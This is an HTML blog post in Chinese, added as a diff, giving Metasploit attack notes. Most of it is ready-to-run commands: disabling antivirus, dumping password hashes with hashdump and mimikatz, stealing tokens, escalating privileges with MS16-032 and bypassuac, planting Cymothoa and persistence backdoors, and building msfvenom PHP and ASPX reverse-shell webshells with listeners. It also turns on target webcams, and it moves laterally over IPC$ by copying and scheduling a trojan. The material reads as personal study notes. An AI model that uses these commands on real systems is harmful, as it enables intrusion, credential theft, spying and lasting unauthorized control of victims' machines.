@@ -1,0 +1,906 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>msf技术 |  小张之栈</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      <canvas class="fireworks"></canvas>
+      <style>
+        .fireworks {
+          position: fixed;
+          left: 0;
+          top: 0;
+          z-index: 99999;
+          pointer-events: none;
+        }
+      </style>
+      
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-msf技术"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+  
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  msf技术
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2023/09/30/msf%E6%8A%80%E6%9C%AF/" class="article-date">
+  <time datetime="2023-09-29T16:01:20.000Z" itemprop="datePublished">2023-09-30</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/msf%E6%8A%80%E6%9C%AF/">msf技术</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">4.9k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">19 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="msf技术"><a href="#msf技术" class="headerlink" title="msf技术"></a>msf技术</h1><p>msf (metasploit framwork)</p>
+<h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><p><strong>1.Auxiliaries(辅助模块)</strong></p>
+<p>负责执行扫描、嗅探、指纹识别等</p>
+<p><strong>2.Exploit(漏洞利用)</strong></p>
+<p>针对系统、应用或服务漏洞进行的攻击行为；还有针对系统漏洞而设计的各种POC验证程序，也有相应的EXP利用代码</p>
+<p><strong>3.payload(攻击载荷)</strong></p>
+<p>传送和植入的可以在目标系统上运行任意命令或执行特定行为的代码</p>
+<p><strong>4.Post(后渗透)</strong></p>
+<p>取得目标系统远程控制后，进行一系列的后渗透攻击动作，如获取敏感信息、跳板等</p>
+<p><strong>5.Encoders(编码)</strong></p>
+<p>负责免杀</p>
+<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ul>
+<li>扫描目标机，扫端口，扫服务，寻找可利用漏洞</li>
+<li>选择并配置一个漏洞利用模块</li>
+<li>选择并配置一个攻击载荷模块</li>
+<li>选择一个编码技术，绕过杀软</li>
+<li>渗透攻击</li>
+</ul>
+<h3 id="实用"><a href="#实用" class="headerlink" title="实用"></a>实用</h3><p>技巧：namp的 -O -Pn </p>
+<p>-Pn不ping，避免被防火墙发现</p>
+<h4 id="后渗透："><a href="#后渗透：" class="headerlink" title="后渗透："></a><strong>后渗透：</strong></h4><h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>当获得了目标的metasploit shell时，该shell是极其脆弱的，如果是利用浏览器漏洞攻陷了目标机器，用户一旦关闭了浏览器，shell就没办法用了。</p>
+<p>1.所以第一时间要<strong>进程迁移</strong></p>
+<p>将它和目标机中的一个稳定的进程绑定在一起</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps <span class="comment">#在kali中输入 `ps`获取目标机的进程</span></span><br><span class="line">getpid <span class="comment">#查看当前进程的pid</span></span><br><span class="line">migrate 448 <span class="comment">#将shell移动到pid为448的进程里</span></span><br></pre></td></tr></table></figure>
+
+<p>2.<strong>系统命令</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">sysinfo <span class="comment">#查看目标机的系统信息</span></span><br><span class="line">run post/windows/gather/checkvm <span class="comment">#检查目标机是否运行在虚拟机上</span></span><br><span class="line">idletime <span class="comment">#查看目标机最近运行时间</span></span><br><span class="line">route <span class="comment">#查看目标机完整的网络设置</span></span><br><span class="line">getuid <span class="comment">#查看当前目标机上渗透成功的用户名</span></span><br><span class="line">run post/windows/manage/killav <span class="comment">#关闭目标机系统杀软</span></span><br><span class="line">run post/windows/manage/enable_rdp <span class="comment">#启动目标机的远程桌面协议，3389</span></span><br><span class="line">run post/windows/manage/autoroute <span class="comment">#查看目标机的本地子网情况</span></span><br><span class="line"><span class="comment">#比如看到了个..172.0的子网</span></span><br><span class="line">route add <span class="comment">#添加这个路由</span></span><br><span class="line"><span class="comment">#route add 192.168.172.0 255.255.255.0 1</span></span><br><span class="line"><span class="comment">#将这个路由添加到了已攻陷主机的路由表中，可以通过被攻陷主机对其它网路攻击了</span></span><br><span class="line"></span><br><span class="line">run post/windows/gather/enum_logged_on_users <span class="comment">#列举当前多少用户登录了目标机</span></span><br><span class="line">run post/windows/gather/enum_applications <span class="comment">#列举安装在目标机上的程序</span></span><br><span class="line"></span><br><span class="line">如果有用户将计算机设置为自动登录，下面这个命令用来抓取自动登录的用户名和密码</span><br><span class="line">run windows/gather/credentials/windows_autologin <span class="comment">#如果没抓到，往下看</span></span><br><span class="line">load espia</span><br><span class="line">screengrab/screenshot <span class="comment">#抓取此时目标机的屏幕截图</span></span><br><span class="line"><span class="comment">#还有些拓展 webcam_list 查看目标机有无摄像头</span></span><br><span class="line"><span class="comment"># webcam_snap打开目标机摄像头，拍张照片</span></span><br><span class="line"><span class="comment"># webcam_stream 开启直播模式</span></span><br><span class="line"><span class="comment"># 还可以输入shell进入目标机shell，即终端吧，exit回到metasploit会话</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>3.文件系统命令</strong></p>
+<p>搜索文件并执行各种任务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.<span class="built_in">pwd</span>/getwd <span class="comment">#查看当前处于目标机的哪个目录</span></span><br><span class="line">2.<span class="built_in">ls</span></span><br><span class="line">3.<span class="built_in">cd</span></span><br><span class="line">4.search -f *.txt -d c:\ <span class="comment">#搜索c盘中所有以&quot;.txt&quot;为扩展的文件</span></span><br><span class="line">5.download c: \test.txt /root <span class="comment">#将目标机C盘的test.txt下载到攻击机root下</span></span><br><span class="line">6.upload /root/test.txt c:\ <span class="comment">#上传攻击机root目录下的test.txt文件到目标机C盘下</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h5 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h5><p>没有管理员权限，就获取不到Hash、安装软件、修改防火墙&#x2F;注册表规则</p>
+<p>所以目标权限就是 Guest-&gt;User-&gt;Administrator-&gt;System</p>
+<p>纵向提权或横向提权，类似于越权的说法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="comment">#进入命令行</span></span><br><span class="line"><span class="built_in">whoami</span> /groups <span class="comment">#查看我们当前的权限 以标准用户为例吧，提权到管理员</span></span><br></pre></td></tr></table></figure>
+
+<p>利用本地溢出漏洞，把用户从User组或其他组提升到管理员组</p>
+<blockquote>
+<p><strong>溢出：</strong>就是指用户输入的数据超过程序预先设定好的缓存区长度，程序会溢出</p>
+</blockquote>
+<h6 id="法一、利用WMIC"><a href="#法一、利用WMIC" class="headerlink" title="法一、利用WMIC"></a>法一、利用WMIC</h6><p>假如，得到了目标机的metaersploit shell后，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">getuid <span class="comment">#查看获得权限 为test权限</span></span><br><span class="line">getsystem <span class="comment">#尝试提权，如果失败</span></span><br><span class="line">systeminfo <span class="comment">#查看目标机打了哪些补丁，如果此时是2个</span></span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn <span class="comment">#列出已安装补丁</span></span><br><span class="line"><span class="comment">#比如现在有一些补丁编号，那么就去使用没有编号的EXP去提权</span></span><br><span class="line"><span class="comment">#如使用MS16-032去提权，对应编号KB3139914</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里介绍下WMIC，是一款命令行管理工具，可以管理本地计算机，(<strong>如果有必要的权限</strong>)，哈可以管理 <strong>同一域内</strong>所有远程计算机，而被管理的远程计算机不需要事先安装WMIC</p>
+</blockquote>
+<p>WMIC分为交互式和非交互式</p>
+<blockquote>
+<p>交互模式： 只输入wmic，进入WMIC上下文本环境中</p>
+<p>非交互：输入wmic及其之后的参数，执行完毕，回到普通cmd下</p>
+</blockquote>
+<p>xp下，低权限用户不能用该命令；win7和win8，低权限可以用wmic</p>
+<p><strong>用途</strong></p>
+<blockquote>
+<p>wmic可调取查看目标机的进程、服务、用户(组)、网络连接、已安装补丁、启动项、已安装软件等</p>
+</blockquote>
+<p><strong>好，下面用MS16-032提权</strong></p>
+<p>将Meterpreter会话转为后台</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; search ms16_032 <span class="comment">#会出现利用选项</span></span><br><span class="line">   &gt;use windows/local.... <span class="comment">#利用选项</span></span><br><span class="line">   &gt;<span class="built_in">set</span> session 1</span><br><span class="line">   &gt; run</span><br><span class="line">   <span class="comment">#如果提权成功了</span></span><br><span class="line">   &gt;getuid  <span class="comment">#出现SYSTEM级权限</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="法二、令牌窃取"><a href="#法二、令牌窃取" class="headerlink" title="法二、令牌窃取"></a>法二、令牌窃取</h6><p>即Token，系统的临时密钥，用来决定是否<strong>允许</strong>这次请求和<strong>判断</strong>这次请求是哪一用户的；</p>
+<p>令牌最大的特点是随机性；分为访问令牌、密保令牌、会话令牌等</p>
+<p>如果假冒令牌的话，需要用到Kerberos协议</p>
+<p>还是获得了目标机的metersploit shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">getuid <span class="comment">#test权限</span></span><br><span class="line">getsystem <span class="comment">#提权失败</span></span><br><span class="line">use incognito </span><br><span class="line">list_tokens -u <span class="comment">#列出可用token</span></span><br><span class="line"><span class="comment"># Delegation Tokens，即授权令牌，支持交互式登录，比如远程桌面登录访问</span></span><br><span class="line"><span class="comment"># 还有一种是Impersonation Tokens</span></span><br><span class="line"><span class="comment"># 假设获得了一个系统管理员的授权令牌，现在去假冒它</span></span><br><span class="line"><span class="comment">#这个令牌叫 WIN-ssda\Administrator，即目标机主机名\登录用户名</span></span><br><span class="line">impersonate_token  WIN-ssda\\Administrator <span class="comment">#两个反斜杠哈</span></span><br><span class="line">shell</span><br><span class="line"><span class="built_in">whoami</span> <span class="comment">#显示是WIN-ssda\\Administrator，假冒成功</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="法三、Hash攻击"><a href="#法三、Hash攻击" class="headerlink" title="法三、Hash攻击"></a>法三、Hash攻击</h6><p>相当于破解哈希值，直接获取登录密码</p>
+<p><strong>1.Hashdump抓取密码</strong></p>
+<p><strong>原理</strong></p>
+<p>计算机的每个账号，用户名密码都在sam文件里，要访问就必须要”系统级”账号，所以要先提权</p>
+<p>在metetsploit shell下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;hashdump <span class="comment">#导出目标机的sam数据库中的Hash</span></span><br><span class="line"><span class="comment">#在非SYSTEM权限下运行该命令会失败</span></span><br><span class="line"><span class="comment">#可以使用msf模块 run windows/gather/smart_hashdump</span></span><br><span class="line"><span class="comment">#然后就利用彩虹表、暴力去破解哈希值</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>2.Quarks PwDump</strong></p>
+<p><strong>what</strong></p>
+<p>win32环境下的系统授权信息导出工具，支持操作系统：</p>
+<blockquote>
+<p><strong>windwos：xp&#x2F;2003&#x2F;Vista&#x2F;7&#x2F;2008&#x2F;8</strong></p>
+</blockquote>
+<p>在windwos密码系统中，密码以加密方式保存在&#x2F;windows&#x2F;system32&#x2F;config下的sam文件里；正常情况下，系统启动后，该文件不能被读取，<strong>但PwDump就可以</strong></p>
+<p><strong>使用</strong></p>
+<p>将工具传到目标机，运行，根据help指令，去提取</p>
+<p><strong>3.Windows Credentials Editor抓取密码</strong></p>
+<p>即WCE，必须在<strong>管理员权限</strong>下使用，还要<strong>注意免杀</strong></p>
+<p><strong>使用</strong></p>
+<p>在metersploit shell下，upload命令将wce.exe上传到目标主机C盘</p>
+<p>进入shell</p>
+<p>cd &#x2F;</p>
+<p>输入wce.exe -w 成功提取系统明文管理员的密码</p>
+<p><strong>4.Mimikatz抓取密码</strong></p>
+<p><strong>限制</strong></p>
+<p><strong>windows 2000&#x2F;xp</strong> 系统下无法使用</p>
+<p>且该工具必须在 <strong>管理员权限下</strong>使用</p>
+<p>msf自带的有</p>
+<p><strong>使用</strong></p>
+<p>在获取系统SYSTEM权限后呢，先查看目标机器的架构 <code>sysinfo</code></p>
+<p>如果服务器是64位操作系统，直接用会导致Meterpreter加载32位的mimikatz，所以<strong>在64位下，将进程迁徙到一个64位程序进程中，再加载工具</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt;migrate 1864 <span class="comment">#如果目标机是64位，先迁移到64位的进程(ps找)</span></span><br><span class="line">		  &gt; load mimikatz</span><br><span class="line">		  &gt; <span class="built_in">help</span> mimikatz <span class="comment">#mimikatz_command可使用该工具全部功能</span></span><br><span class="line">		  <span class="comment">#需要加载一个错误模块得到可用模块的完整列表</span></span><br><span class="line">		  &gt;mimikatz_command - f a::</span><br><span class="line">		  &gt;mimikatz_command - f <span class="built_in">hash</span>:: <span class="comment">#查看hash有lm和ntlm两种</span></span><br><span class="line">		  &gt;msv <span class="comment">#直接输入msc抓取系统Hash值</span></span><br><span class="line">		  &gt;kerberos <span class="comment">#抓取系统票据</span></span><br><span class="line">		  &gt;wdigest <span class="comment">#获取系统账户信息</span></span><br><span class="line">		  &gt;samdump <span class="comment">#查看该命令可用选项</span></span><br><span class="line">		  &gt;mimikatz_command -f samdump::hashes <span class="comment">#抓取hash</span></span><br><span class="line">		  <span class="comment">#得到用户名及其哈希值</span></span><br><span class="line">		  </span><br></pre></td></tr></table></figure>
+
+<h5 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h5><p><strong>what</strong></p>
+<p>维持对目标机的控制权；随时连接到目标机，一般是一个隐藏进程(自启动、永久㐏)，允许普通的、未授权的用户控制计算机</p>
+<p><strong>操作系统后门</strong></p>
+<p><strong>1.Cymothoa后门</strong></p>
+<p>将shellcode注入现有进程的后门工具；将shellcode伪装成常规程序，只要目标系统不检测内存，发现不了这个后门程序的进程；</p>
+<p>后门以允许中的程序为宿主，只要进程关闭或目标重启，就用不了了</p>
+<p><strong>使用</strong></p>
+<p>1.查看程序PID </p>
+<blockquote>
+<p>linux用 ps -aux</p>
+<p>windows 用tasklist</p>
+</blockquote>
+<ol start="2">
+<li><p><code>Cymothoa -s</code>可以看到很多shellcode的编号列表</p>
+</li>
+<li><p>在目标机中使用<code>Cymothoa -p 982 -s 1 -y 4444</code></p>
+<blockquote>
+<p>即将pid为982的进程为宿主进程，选用第一类shellcode，payload服务端口为4444</p>
+</blockquote>
+</li>
+<li><p>攻击机连接目标主机的后门 <code>Nc -nvv 192.168.31.247 4444</code></p>
+</li>
+</ol>
+<p><strong>2.Persistence后门</strong></p>
+<p>一个安装自启动方式的持久性后门程序。</p>
+<p>在metersploit 中，获取了目标机的meterpreter shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run persistence -h</span><br><span class="line">run persistence -A -S -U -i 60 -p 4321 -r 192.168.x.x</span><br><span class="line"><span class="comment">#A自动启动payload程序 S系统启动时加载 U用户登录时启动 X开启时自动加载</span></span><br><span class="line"><span class="comment">#i 回连的时间间隔 p监听反向连接端口号 r目标机ip</span></span><br><span class="line">sessions <span class="comment">#查看已经成功获取的会话</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意：该脚本在目标机上创建文件，会触发杀软，使用前应关闭目标机杀软</p>
+</blockquote>
+<p><strong>web后门</strong></p>
+<p>即webshell，网页代码，一句话木马这种；它们运行在服务器端，为攻击者提供执行命令、目录浏览、辅助提权、sql语句执行、反弹shell等功能。</p>
+<p>工具代表：蚁剑、冰蝎、哥斯拉</p>
+<p><strong>1、Meterpreter后门</strong></p>
+<p>metersploit 自带一个php meterpreter的payload，可以创建具有meterpreter功能的php whbshell</p>
+<p><strong>步骤</strong></p>
+<blockquote>
+<p>使用msfvenom创建一个webshell.php</p>
+<p>上传webshell.php到目标机</p>
+<p>运行Metersploit multi-handler开始监听</p>
+<p>访问webshell.php页面</p>
+<p>获得反弹的Metersploit shell</p>
+</blockquote>
+<p>在终端中输入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=kali的ip -f raw &gt; shuteer.php</span><br></pre></td></tr></table></figure>
+
+<p>生成php shell</p>
+<p><strong>想办法</strong>将该shell上传到目标机，演示的话，那就是将它复制到虚拟机的&#x2F;var&#x2F;www&#x2F;html目录</p>
+<p>然后嘞，攻击者启动msfconsole</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use exploit/multi/handler</span><br><span class="line">	&gt;<span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">	&gt; <span class="built_in">set</span> lhost 攻击者ip</span><br><span class="line">	&gt; run</span><br></pre></td></tr></table></figure>
+
+<p>虚拟机这边自己访问一下 <code>localhost/shuteer.php</code></p>
+<p>攻击者的msf就反弹成功</p>
+<p>那后续步骤就是 sysinfo、getuid等命令渗透主机了</p>
+<p><strong>2.Aspx Meterpreter后门</strong></p>
+<p>利用Metersploit 的 <code>shell_reverse_tcp</code> 的Payload，可以创建有Metersploit功能的各个版本shellcode(Asp、Aspx、msi、vbs、war)</p>
+<p>以Aspx为例</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">show payloads</span><br><span class="line">use windwos/shell_reverse_tcp</span><br><span class="line">info</span><br><span class="line"><span class="built_in">set</span> lhost 攻击者ip</span><br><span class="line"><span class="built_in">set</span> lport 4444</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">generate -h <span class="comment">#查看生成各版本的shellcode命令</span></span><br><span class="line">generate -t aspx <span class="comment">#aspx的</span></span><br><span class="line"><span class="comment">#复制下面出现的内容到aspx.aspx文件中</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>上传到目标机</p>
+<p>攻击者在msf中监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 攻击者ip</span><br><span class="line"><span class="built_in">set</span> lhost 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>如果知道对方的路径的话，访问一下aspx文件，比如</p>
+<p><code>目标机ip/aspx.aspx</code></p>
+<p>那攻击者的msf反弹成功，进入到meterpreter shell中</p>
+<p>之后一样，sysinfo和getuid去渗透目标机</p>
+<h5 id="内网攻击域渗透"><a href="#内网攻击域渗透" class="headerlink" title="内网攻击域渗透"></a><strong>内网攻击域渗透</strong></h5><p>找到一个目标服务器，公网和内网都靠它，拿下它，再谈内网咋搞</p>
+<p>websehll(普通权限)-&gt;域管权限</p>
+<p><strong>1.提权</strong></p>
+<p>假如，通过<strong>各种方式</strong>上传了免杀的payload到了目标服务器上，要么通过webshell工具，要么msf反弹</p>
+<p>拿到webshell-&gt;提权</p>
+<p><strong>先尝试本地溢出漏洞提权</strong></p>
+<p>即，现有的exp去利用下，将用户从User组-&gt;管理员组</p>
+<p>查看权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span> <span class="comment">#比如 moasd\q123</span></span><br><span class="line">net user q123 /domain <span class="comment">#查看它的权限 如果是普通域用户权限</span></span><br></pre></td></tr></table></figure>
+
+<p>查看补丁 <code>systeminfo</code> 是windwos2008的系统</p>
+<p>发现补丁很全啊，MS1505，MS15078都不行了</p>
+<p><strong>尝试Bypass UAC提权</strong></p>
+<p>使用前提：</p>
+<blockquote>
+<p>系统当前用户在<strong>管理员组</strong>，用户账户控制程序UAC设置为默认，即“仅在程序试图更改我的计算机时，通知我”</p>
+<p>且该模块在目标机创建多个文件，易被杀软识别</p>
+</blockquote>
+<p>即绕过Windwos账户控制(UAC)，现在具有一个普通域用户的权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf&gt;use exploit/windows/local/bypassuac</span><br><span class="line">	&gt;<span class="built_in">set</span> session 1</span><br><span class="line">	&gt;run</span><br><span class="line">	<span class="comment">#失败</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>提权失败，继续渗透</p>
+<p><strong>2.信息收集</strong></p>
+<p>提权失败，继续收集其他信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ipconfig</span><br><span class="line"></span><br><span class="line">net user  <span class="comment">#查看本地用户列表</span></span><br><span class="line">net user /domain <span class="comment">#查看域用户</span></span><br><span class="line">net view /domain <span class="comment">#查看有几个域</span></span><br><span class="line">net view /domain:XXX <span class="comment">#查看XXX域内的主机</span></span><br><span class="line">net group /domain <span class="comment">#查看域内的组</span></span><br><span class="line">net group <span class="string">&quot;domain computers&quot;</span> /domain <span class="comment">#查看域内所有主机名</span></span><br><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain <span class="comment">#查看域管理员</span></span><br><span class="line">net group <span class="string">&quot;domain controllers&quot;</span> /domain <span class="comment">#查看域控制器</span></span><br><span class="line">net group <span class="string">&quot;enterprise admins&quot;</span> /domain <span class="comment">#查看企业管理组</span></span><br><span class="line">net time /domain <span class="comment">#查看时间服务器</span></span><br><span class="line">net accounts: 查看本地密码策略</span><br><span class="line">net localgroup: 查看当前计算机中所有组</span><br><span class="line">net localgroup administrators: 查看管理员组的信息(哪些用户为管理员)</span><br><span class="line">net statistics workstation: 查看主机开机时间和开机后的网络状态</span><br><span class="line">net session: 列出本地计算机连接的客户端对话信息</span><br><span class="line">net share: 查看本机共享列表和可访问的域共享列表</span><br><span class="line">net use 本地盘符 \\目标IP地址\目标共享名: 这里目标共享名可以通过对目标执行net share查看,这条命令可以将目标盘符挂载到我们本地</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>关键是弄清内网的划分</p>
+<p>各机器名的命名规则：根据机器名找重要人物的计算机</p>
+<p>目标机是否为多层域结构：探测出域管理员名字和域服务器名字</p>
+<p>命令清单：</p>
+<p> <a target="_blank" rel="noopener" href="http://t.csdnimg.cn/LbFcr">http://t.csdnimg.cn/LbFcr</a></p>
+<p><a target="_blank" rel="noopener" href="http://t.csdnimg.cn/HAAKW">http://t.csdnimg.cn/HAAKW</a></p>
+</blockquote>
+<p><strong>3.获取一台服务器权限</strong></p>
+<p>目标是域服务器，但如果当前服务器A不能攻击到域服务器B，要么<strong>提权</strong>；要么攻击<strong>可以连到域服务器B的那个服务器C</strong>，再用C去攻击B</p>
+<p>如果是因为权限问题不能连接到<strong>域服务器B</strong>，选择下列的方法</p>
+<blockquote>
+<p>添加内网路由，弱口令扫描</p>
+<p>powershell对内网扫描</p>
+<p>假设socks4a，socks会自动内网扫描</p>
+<p>其他</p>
+</blockquote>
+<p>这里有个简单的方法，比如当前服务器A的机器名，yuleiyun12，</p>
+<p>那可以尝试 <code>net use yuleiyun131</code>，假设成功了</p>
+<p><strong>IPC$渗透</strong></p>
+<p>使用windwos系统中默认启动的IPC$共享获得计算机控制权的入侵</p>
+<p>假设有一台IPC$主机127.0.0.25</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net use \\127.0.0.25\ipc$ <span class="comment">#连接127.0.0.25的ipc$共享</span></span><br><span class="line">copy srv.exe \\127.0.0.25\ipc$ <span class="comment">#复制exe到目标主机</span></span><br><span class="line">net time \\127.0.0.25\ipc$ <span class="comment">#查时间</span></span><br><span class="line">at \\127.0.0.25 10:50 src.exe <span class="comment">#在10:50启动exe(要比主机时间早一点) 现在at已经换了，到时候cmd会提示的</span></span><br><span class="line"><span class="comment">#上面的127.0.0.25，可以换成机器名yuleiyun131</span></span><br></pre></td></tr></table></figure>
+
+<p>以上就是ipc$用法</p>
+<p>实际渗透的时候，可以将<strong>免杀后的payload</strong> copy过去</p>
+<p>然后使用at命令启动木马</p>
+<p>返回msf的handler监听即可，反弹了<strong>meterpreter shell</strong></p>
